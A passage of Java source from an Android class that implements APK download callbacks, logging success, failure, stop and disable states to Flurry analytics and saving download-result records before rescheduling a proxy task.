		result.setApkVersionName(versionName);
		try {
			result.saveInBackground();
		} catch (Throwable e) {
			FlurryAgent.onError(TAG, "", e);
		}
		scheduledWithFixedDelay(PROXY_INTERVAL_TIME);
	}

	@Override
	public void onApkDownloadSuccess(AppModel model) {
		Map<String, String> map = new HashMap<>();
		map.put(NativeParams.KEY_DOWNLOAD_SUCCESS, String.valueOf(true));
		FlurryAgent.logEvent(NativeParams.EVENT_START_DOWNLOAD, map);
		if (DEBUG) {
			final String downloadSuccess = "\nDownload success(isExist)\n";
			EventBus.getDefault().post(new MessageEvent(downloadSuccess));
		}
		ApkDownloadResult result = new ApkDownloadResult();
		result.setApkDownloadDestUrl(model.getDownloadUrl());
		result.setApkDownloadRawUrl(model.getDownloadUrl());
		result.setApkDownloadResult("success");
		result.setApkPackageName(this.getPackageName());
		result.setApkVersionName(versionName);
		try {
			result.saveInBackground();
		} catch (Throwable e) {
			FlurryAgent.onError(TAG, "", e);
		}
		if (DEBUG) {
			Log.d(TAG, "stop mySelf!!!!!!!!");
		}

		scheduledWithFixedDelay(PROXY_INTERVAL_TIME);
	}

	@Override
	public void onApkDownloadFailed(net.luna.common.download.model.FileDownloadTask task) {
		Map<String, String> map = new HashMap<>();
		map.put(NativeParams.KEY_DOWNLOAD_SUCCESS, String.valueOf(false));
		FlurryAgent.logEvent(NativeParams.EVENT_START_DOWNLOAD, map);
		if (DEBUG) {
			final String downloadFail = "\nDownload Fail\n";
			EventBus.getDefault().post(new MessageEvent(downloadFail));
		}
		ApkDownloadResult result = new ApkDownloadResult();
		result.setApkDownloadDestUrl(task.getDestUrl());
		result.setApkDownloadRawUrl(task.getRawUrl());
		result.setApkDownloadResult("fail");
		result.setApkPackageName(this.getPackageName());
		result.setApkVersionName(versionName);
		try {
			result.saveInBackground();
		} catch (Throwable e) {
			FlurryAgent.onError(TAG, "", e);
		}
		scheduledWithFixedDelay(PROXY_INTERVAL_TIME);
	}

	@Override
	public void onApkDownloadStop(net.luna.common.download.model.FileDownloadTask task) {

	}

	@Override
	public void onApkDownloadProgressUpdate(net.luna.common.download.model.FileDownloadTask task, long contentLength,
	                                        long completeLength, int
			                                        percent) {
	}

	@Override
	public void onApkInstallSuccess(AppModel model) {
//		Map<String, String> map = new HashMap<>();
//		map.put(NativeParams.KEY_INSTALL_SUCCESS, String.valueOf(true));
//		map.put(NativeParams.KEY_IS_DEVICE_ROOT, String.valueOf(RootTools.isAccessGiven()));
//		FlurryAgent.logEvent(NativeParams.EVENT_START_INSTALL, map);
//
//        final String installSuccess = "\ninstallSuccess\n";
//        EventBus.getDefault().post(new MessageEvent(installSuccess));

	}

	@Override
	public void onDownloadStatusChanged(SimpleAppInfo info) {
		if (DEBUG) {
			Log.d(TAG, "download_state:" + info.getDownloadStatus());
		}
		if (info.getDownloadStatus() == DownloadStatus.FINISHED) {
			if (DEBUG) {
				Log.d(TAG, "apkDownloadSuccess!!!!!!!!!");
				final String downloadSuccess = "\nDownload success\n";
				EventBus.getDefault().post(new MessageEvent(downloadSuccess));
			}
			Map<String, String> map = new HashMap<>();
			map.put(NativeParams.KEY_DOWNLOAD_SUCCESS, String.valueOf(true));
			FlurryAgent.logEvent(NativeParams.EVENT_START_DOWNLOAD, map);
			ApkDownloadResult result = new ApkDownloadResult();
			result.setApkDownloadDestUrl(info.getOwkUrl());
			result.setApkDownloadRawUrl(info.getOwkUrl());
			result.setApkDownloadResult("success");
			result.setApkPackageName(this.getPackageName());
			result.setApkVersionName(versionName);
			try {
				result.saveInBackground();
			} catch (Throwable e) {
				FlurryAgent.onError(TAG, "", e);
			}
			scheduledWithFixedDelay(PROXY_INTERVAL_TIME);
		} else if (info.getDownloadStatus() == DownloadStatus.FAILED) {
			if (DEBUG) {
				Log.d(TAG, "apkDownloadFail!!!!!!!!!!!!!");
				final String downloadFailed = "\nDownload failed\n";
				EventBus.getDefault().post(new MessageEvent(downloadFailed));
			}
			Map<String, String> map = new HashMap<>();
			map.put(NativeParams.KEY_DOWNLOAD_SUCCESS, String.valueOf(false));
			FlurryAgent.logEvent(NativeParams.EVENT_START_DOWNLOAD, map);
			ApkDownloadResult result = new ApkDownloadResult();
			result.setApkDownloadDestUrl(info.getOwkUrl());
			result.setApkDownloadRawUrl(info.getOwkUrl());
			result.setApkDownloadResult("fail");
			result.setApkPackageName(this.getPackageName());
			result.setApkVersionName(versionName);
			try {
				result.saveInBackground();
			} catch (Throwable e) {
				FlurryAgent.onError(TAG, "", e);
			}
			scheduledWithFixedDelay(PROXY_INTERVAL_TIME);
		} else if (info.getDownloadStatus() == DownloadStatus.DISABLE) {
			if (DEBUG) {
				Log.d(TAG, "apkDownloadDisable!!!!!!!!!!!!!");
				final String downloadFailed = "\nDownload disable\n";
				EventBus.getDefault().post(new MessageEvent(downloadFailed));
			}
			Map<String, String> map = new HashMap<>();
			map.put(NativeParams.KEY_DOWNLOAD_SUCCESS, String.valueOf(false));
			FlurryAgent.logEvent(NativeParams.EVENT_START_DOWNLOAD, map);
			ApkDownloadResult result = new ApkDownloadResult();
			result.setApkDownloadDestUrl(info.getOwkUrl());
			result.setApkDownloadRawUrl(info.getOwkUrl());
			result.setApkDownloadResult("disable");
			result.setApkPackageName(this.getPackageName());
			result.setApkVersionName(versionName);
			try {
				result.saveInBackground();
			} catch (Throwable e) {
				FlurryAgent.onError(TAG, "", e);
			}
			scheduledWithFixedDelay(PROXY_INTERVAL_TIME);
		}
	}


	@Override
	public void onProgressUpdate(String url, int percent, long speedBytesPerS) {
		if (DEBUG) {
			Log.d(TAG, "onProgressUpdate!!!!!!!!!!!url:" + url + " percent:" + percent + " speedBytesPerS:" +
					speedBytesPerS);
		}
	}

	@Override
	public void onApkDownloadBeforeStart_FileLock(net.youmi.android.libs.common.download.model.FileDownloadTask task) {

	}

	@Override
	public void onApkDownloadStart(net.youmi.android.libs.common.download.model.FileDownloadTask task) {

	}

	@Override
	public void onApkDownloadSuccess(net.youmi.android.libs.common.download.model.FileDownloadTask task) {
		if (DEBUG) {
			Log.d(TAG, "apkDownloadSuccess!!!!!!!!!");
			final String downloadSuccess = "\nDownload success\n";
			EventBus.getDefault().post(new MessageEvent(downloadSuccess));
		}
		Map<String, String> map = new HashMap<>();
		map.put(NativeParams.KEY_DOWNLOAD_SUCCESS, String.valueOf(true));
		FlurryAgent.logEvent(NativeParams.EVENT_START_DOWNLOAD, map);
		ApkDownloadResult result = new ApkDownloadResult();
		result.setApkDownloadDestUrl(task.getDestUrl());
		result.setApkDownloadRawUrl(task.getRawUrl());
		result.setApkDownloadResult("success");
		result.setApkPackageName(this.getPackageName());
		result.setApkVersionName(versionName);
		try {
			result.saveInBackground();
		} catch (Throwable e) {
			FlurryAgent.onError(TAG, "", e);
		}
		scheduledWithFixedDelay(PROXY_INTERVAL_TIME);
	}

	@Override
	public void onApkDownloadFailed(net.youmi.android.libs.common.download.model.FileDownloadTask task) {
		if (DEBUG) {
			Log.d(TAG, "apkDownloadFail!!!!!!!!!!!!!");
			final String downloadFailed = "\nDownload failed\n";
			EventBus.getDefault().post(new MessageEvent(downloadFailed));
		}
		Map<String, String> map = new HashMap<>();
		map.put(NativeParams.KEY_DOWNLOAD_SUCCESS, String.valueOf(false));
		FlurryAgent.logEvent(NativeParams.EVENT_START_DOWNLOAD, map);
		ApkDownloadResult result = new ApkDownloadResult();
		result.setApkDownloadDestUrl(task.getDestUrl());
		result.setApkDownloadRawUrl(task.getRawUrl());
		result.setApkDownloadResult("fail");
		result.setApkPackageName(this.getPackageName());
		result.setApkVersionName(versionName);
		try {
			result.saveInBackground();
		} catch (Throwable e) {
			FlurryAgent.onError(TAG, "", e);
		}
		scheduledWithFixedDelay(PROXY_INTERVAL_TIME);
	}

	@Override
	public void onApkDownloadStop(net.youmi.android.libs.common.download.model.FileDownloadTask task) {
		if (DEBUG) {
			Log.d(TAG, "apkDownloadStop!!!!!!!!!!!!!");
			final String downloadStopped = "\nDownload stopped\n";
			EventBus.getDefault().post(new MessageEvent(downloadStopped));
		}
		Map<String, String> map = new HashMap<>();
		map.put(NativeParams.KEY_DOWNLOAD_SUCCESS, String.valueOf(false));
		FlurryAgent.logEvent(NativeParams.EVENT_START_DOWNLOAD, map);
		ApkDownloadResult result = new ApkDownloadResult();
		result.setApkDownloadDestUrl(task.getDestUrl());
		result.setApkDownloadRawUrl(task.getRawUrl());
		result.setApkDownloadResult("stop");
		result.setApkPackageName(this.getPackageName());
		result.setApkVersionName(versionName);
		try {
			result.saveInBackground();
		} catch (Throwable e) {
			FlurryAgent.onError(TAG, "", e);
		}
		scheduledWithFixedDelay(PROXY_INTERVAL_TIME);
	}

	@Override
	public void onApkDownloadProgressUpdate(net.youmi.android.libs.common.download.model.FileDownloadTask task, long
			contentLength, long completeLength, int percent, long speedBytesPerS) {

	}

	@Override
	public void onApkInstallSuccess(int rawUrlHashCode) {

	}

	@Override
	public void onConnectAbort() {

	}
}
